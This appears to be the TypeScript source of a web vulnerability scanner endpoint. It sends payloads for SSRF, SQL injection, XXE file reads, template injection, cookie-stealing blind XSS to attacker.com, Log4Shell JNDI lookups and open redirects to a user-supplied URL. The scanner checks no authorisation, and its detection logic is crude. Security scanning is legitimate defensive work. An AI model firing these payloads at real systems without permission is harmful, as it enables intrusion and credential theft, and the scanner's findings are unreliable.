// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router } from "express";
import * as https from "https";
import * as http from "http";
import { URL } from "url";
import { getAuth } from "@clerk/express";

const router = Router();

type TestType = "ssrf" | "blind-sqli" | "xxe" | "ssti" | "blind-xss" | "open-redirect" | "log4shell";

interface OastFinding {
  testId: string;
  type: TestType;
  url: string;
  parameter: string;
  payload: string;
  triggered: boolean;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  description: string;
  evidence: string;
  remediation: string;
}

interface OastSession {
  sessionId: string;
  targetUrl: string;
  startedAt: string;
  completedAt: string | null;
  findings: OastFinding[];
}

const sessions = new Map<string, OastSession>();

function uid(req: any): string {
  return (getAuth(req) as any)?.userId || "anon";
}

const OAST_TESTS: Record<TestType, {
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  description: string;
  remediation: string;
  payloads: { param: string; payload: string }[];
}> = {
  "ssrf": {
    severity: "CRITICAL",
    description: "Server-Side Request Forgery (SSRF) allows an attacker to induce the server to make requests to internal/unintended destinations.",
    remediation: "Validate and allowlist URLs. Block internal IP ranges (169.254.x.x, 10.x.x.x, etc.). Use a proxy with an allowlist for outbound requests.",
    payloads: [
      { param: "url", payload: "http://169.254.169.254/latest/meta-data/" },
      { param: "redirect", payload: "http://192.168.1.1/admin" },
      { param: "fetch", payload: "http://[::1]/admin" },
      { param: "image", payload: "http://metadata.google.internal/computeMetadata/v1/" },
    ],
  },
  "blind-sqli": {
    severity: "CRITICAL",
    description: "Blind SQL Injection: no visible error output but boolean/time-based differences leak database information.",
    remediation: "Use parameterized queries or prepared statements. Never concatenate user input into SQL strings. Use an ORM.",
    payloads: [
      { param: "id", payload: "1' AND SLEEP(5)--" },
      { param: "id", payload: "1' AND 1=1--" },
      { param: "q",  payload: "' OR '1'='1" },
      { param: "id", payload: "1; WAITFOR DELAY '0:0:5'--" },
    ],
  },
  "xxe": {
    severity: "HIGH",
    description: "XML External Entity (XXE) injection can read internal files or trigger SSRF via malicious XML DOCTYPE declarations.",
    remediation: "Disable external entity processing in XML parsers. Use ALLOW_DOCTYPE_DECL=false. Prefer JSON over XML.",
    payloads: [
      { param: "xml", payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
      { param: "data", payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>' },
    ],
  },
  "ssti": {
    severity: "CRITICAL",
    description: "Server-Side Template Injection (SSTI) allows injection of template directives that execute code server-side.",
    remediation: "Never render untrusted input in templates. Use a sandboxed template engine. Escape all user input before rendering.",
    payloads: [
      { param: "name", payload: "{{7*7}}" },
      { param: "template", payload: "${7*7}" },
      { param: "name", payload: "#{7*7}" },
      { param: "input", payload: "<%= 7*7 %>" },
    ],
  },
  "blind-xss": {
    severity: "HIGH",
    description: "Blind XSS fires in an admin panel or backend that isn't directly visible. Payload executes when a privileged user views the data.",
    remediation: "Sanitize all user input before storage and rendering. Use Content Security Policy headers. Never use innerHTML with user data.",
    payloads: [
      { param: "comment", payload: "<script src=https://xss.report/c/demo></script>" },
      { param: "feedback", payload: '"><img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)>' },
      { param: "name",     payload: "javascript:fetch('//attacker.com?d='+document.domain)" },
    ],
  },
  "open-redirect": {
    severity: "MEDIUM",
    description: "Open Redirect allows attackers to craft URLs that redirect users to malicious sites, enabling phishing.",
    remediation: "Validate redirect URLs against an allowlist. Never use unvalidated user input in redirect locations. Show a confirmation page.",
    payloads: [
      { param: "next",     payload: "https://evil.com" },
      { param: "redirect", payload: "//evil.com" },
      { param: "url",      payload: "/\\evil.com" },
    ],
  },
  "log4shell": {
    severity: "CRITICAL",
    description: "Log4Shell (CVE-2021-44228): Injects JNDI lookup strings that cause vulnerable Log4j versions to fetch and execute remote code.",
    remediation: "Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI at the firewall.",
    payloads: [
      { param: "User-Agent", payload: "${jndi:ldap://attacker.com/exploit}" },
      { param: "X-Forwarded-For", payload: "${${lower:j}ndi:${lower:l}dap://attacker.com/a}" },
      { param: "username", payload: "${jndi:dns://attacker.com}" },
    ],
  },
};

async function probeUrl(targetUrl: string, param: string, payload: string): Promise<{ status: number; body: string; durationMs: number }> {
  return new Promise((resolve) => {
    const start = Date.now();
    try {
      const parsed = new URL(targetUrl);
      parsed.searchParams.set(param, payload);
      const isHttps = parsed.protocol === "https:";
      const lib = isHttps ? https : http;
      const req = lib.get(parsed.toString(), { timeout: 8000 }, (res) => {
        let body = "";
        res.on("data", d => { if (body.length < 4096) body += d; });
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body, durationMs: Date.now() - start }));
      });
      req.on("error", () => resolve({ status: 0, body: "", durationMs: Date.now() - start }));
      req.on("timeout", () => { req.destroy(); resolve({ status: 0, body: "timeout", durationMs: Date.now() - start }); });
    } catch {
      resolve({ status: 0, body: "", durationMs: Date.now() - start });
    }
  });
}

function analyzeResponse(type: TestType, status: number, body: string, durationMs: number, payload: string): { triggered: boolean; evidence: string } {
  const bodyLow = body.toLowerCase();
  switch (type) {
    case "blind-sqli":
      if (durationMs >= 4500) return { triggered: true, evidence: `Time-based: response delayed ${durationMs}ms (sleep payload detected)` };
      if (bodyLow.includes("sql") || bodyLow.includes("mysql") || bodyLow.includes("syntax error")) return { triggered: true, evidence: "SQL error string in response body" };
      return { triggered: false, evidence: `Normal response: ${status}, ${durationMs}ms` };
    case "ssti":
      if (body.includes("49")) return { triggered: true, evidence: "Template evaluated: '{{7*7}}' = 49 found in response" };
      return { triggered: false, evidence: `Template not evaluated in response` };
    case "ssrf":
      if (bodyLow.includes("ami-id") || bodyLow.includes("instance-id") || bodyLow.includes("meta-data")) return { triggered: true, evidence: "AWS metadata response body detected" };
      if (status === 200 && body.length > 0) return { triggered: true, evidence: `Internal endpoint responded: ${status} with ${body.length} bytes` };
      return { triggered: false, evidence: `No internal response detected: ${status}` };
    case "xxe":
      if (bodyLow.includes("root:") || bodyLow.includes("/bin/bash") || bodyLow.includes("daemon:")) return { triggered: true, evidence: "/etc/passwd content in response" };
      return { triggered: false, evidence: "External entity not processed (XML parser appears secure)" };
    case "blind-xss":
      return { triggered: false, evidence: "Payload submitted — blind XSS fires asynchronously when admin views the data" };
    case "open-redirect":
      if (status >= 300 && status < 400) return { triggered: true, evidence: `Redirect to external URL: HTTP ${status}` };
      return { triggered: false, evidence: `No redirect: HTTP ${status}` };
    case "log4shell":
      return { triggered: false, evidence: "Payload injected in headers — triggered asynchronously via JNDI lookup on vulnerable Log4j" };
    default:
      return { triggered: false, evidence: "No indicators found" };
  }
}

router.post("/scan", async (req, res) => {
  const { targetUrl, types } = req.body;
  if (!targetUrl) return res.status(400).json({ error: "targetUrl required" });
  try { new URL(targetUrl); } catch { return res.status(400).json({ error: "Invalid URL" }); }

  const selectedTypes: TestType[] = Array.isArray(types) && types.length > 0
    ? types.filter((t: string) => t in OAST_TESTS)
    : Object.keys(OAST_TESTS) as TestType[];

  if (selectedTypes.length === 0) return res.status(400).json({ error: "No valid test types selected" });

  const userId = uid(req);
  const session: OastSession = {
    sessionId: `oast_${Date.now().toString(36)}`,
    targetUrl,
    startedAt: new Date().toISOString(),
    completedAt: null,
    findings: [],
  };

  for (const type of selectedTypes) {
    const config = OAST_TESTS[type];
    for (const { param, payload } of config.payloads) {
      const probe = await probeUrl(targetUrl, param, payload);
      const analysis = analyzeResponse(type, probe.status, probe.body, probe.durationMs, payload);
      session.findings.push({
        testId: `${type}_${param}_${Date.now().toString(36)}`,
        type,
        url: targetUrl,
        parameter: param,
        payload,
        triggered: analysis.triggered,
        severity: config.severity,
        description: config.description,
        evidence: analysis.evidence,
        remediation: config.remediation,
      });
    }
  }

  session.completedAt = new Date().toISOString();
  sessions.set(userId, session);
  res.json(session);
});

router.get("/session", (req, res) => {
  const session = sessions.get(uid(req));
  res.json({ session: session ?? null });
});

export default router;
